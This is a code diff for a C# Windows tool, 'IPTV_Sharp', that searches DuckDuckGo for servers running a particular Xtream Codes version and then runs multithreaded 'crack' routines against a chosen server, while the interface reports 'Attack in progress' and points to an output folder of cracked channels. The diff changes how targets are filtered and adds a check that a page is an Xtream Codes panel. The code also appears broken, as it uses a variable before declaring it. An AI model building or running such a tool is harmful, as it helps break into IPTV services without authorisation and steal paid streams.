@@ -48,7 +48,6 @@ namespace IPTV_Sharp
         {
 
             string url = "https://duckduckgo.com/html/?q=Xtream+Codes+v1.0.59.5&kl=it-it";
-            string[] banned = { "pastie", "pastebin", "facebook", "github", "twitter", "google", "bing", "yahoo", "amazon" };
             var servers = new List<string>();
 
             HtmlWeb crawler = new HtmlWeb();
@@ -58,21 +57,17 @@ namespace IPTV_Sharp
             {
                 HtmlAttribute att = link.Attributes["href"];
 
-                if (!banned.Any(att.Value.Contains))
+                if (att.Value.Contains("http://"))
                 {
-                    if (att.Value.Contains("http://"))
+                    string[] temp = att.Value.Split('/');
+                    string tempx = temp[0] + "//" + temp[2];
+                    if (!servers.Any(tempx.Contains) && temp[2].Contains(":"))
                     {
-                        string[] temp = att.Value.Split('/');
-                        string tempx = temp[0] + "//" + temp[2];
-                        if (!servers.Any(tempx.Contains))
-                        {
-                            servers.Add(tempx);
-                            comboBox1.Items.Add(tempx);
-                        }
+                        servers.Add(tempx);
+                        comboBox1.Items.Add(tempx);
                     }
-                }     
-            }
-
+                }
+            }     
 
             label3.Visible = false;
             label1.Visible = true;
@@ -90,33 +85,51 @@ namespace IPTV_Sharp
             }
             else
             {
-                string server = comboBox1.Text;
-                label3.Text = "Attack in progress, check output directory for cracked channel";
-                label3.Visible = true;
-                label1.Enabled = false;
-                comboBox1.Enabled = false;
-                button1.Enabled = false;
-
-                int x = 0;
-                Thread[] threads = new Thread[17];
-
-                foreach (String list in lists)
+                using (WebClient client = new WebClient())
                 {
-                    threads[x] = new Thread(() => crack(server, list));
-                    threads[x].Start();
+                    try
+                    {
+                        string page = client.DownloadString(server);
+                        if (page != "" && page.Contains("Xtream Codes"))
+                        {
+                            string server = comboBox1.Text;
+                            label3.Text = "Attack in progress, check output directory for cracked channel";
+                            label3.Visible = true;
+                            label1.Enabled = false;
+                            comboBox1.Enabled = false;
+                            button1.Enabled = false;
+
+                            int x = 0;
+                            Thread[] threads = new Thread[17];
+
+                            foreach (String list in lists)
+                            {
+                                threads[x] = new Thread(() => crack(server, list));
+                                threads[x].Start();
+                            }
+
+                            foreach(Thread thread in threads)
+                            {
+                                thread.Join();
+                            }
+
+                            MessageBox.Show("Done!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+
+                            label3.Visible = false;
+                            label1.Enabled = true;
+                            comboBox1.Enabled = true;
+                            button1.Enabled = true;
+                        }
+                        else
+                        {
+                            MessageBox.Show("Target is not a IPTV site.", "No IPTV site", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+                        }
+                    }
+                    catch (WebException ex)
+                    {
+                        MessageBox.Show("Invalid URL!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
-
-                foreach(Thread thread in threads)
-                {
-                    thread.Join();
-                }
-
-                MessageBox.Show("Done!", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
-
-                label3.Visible = false;
-                label1.Enabled = true;
-                comboBox1.Enabled = true;
-                button1.Enabled = true;
             }
         }
     }
